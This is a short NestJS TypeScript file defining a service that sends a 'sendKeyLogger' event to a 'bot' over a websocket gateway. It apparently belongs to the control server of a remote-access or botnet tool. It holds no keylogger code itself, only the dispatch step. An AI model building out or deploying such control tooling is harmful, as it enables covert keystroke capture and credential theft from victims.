import { Injectable } from "@nestjs/common";
import { WsBotGateway } from "../../infrastructure/ws-bot.gateway";

@Injectable()
export class WsBotKeyLoggerUseCase {
  constructor(private readonly wsBotGateway: WsBotGateway) {}

  async sendKeyLoggerToBot(controllerid: string, keys: string[]) {
    return this.wsBotGateway.sendEventToBot(controllerid, "sendKeyLogger", {
      keys,
    });
  }
}
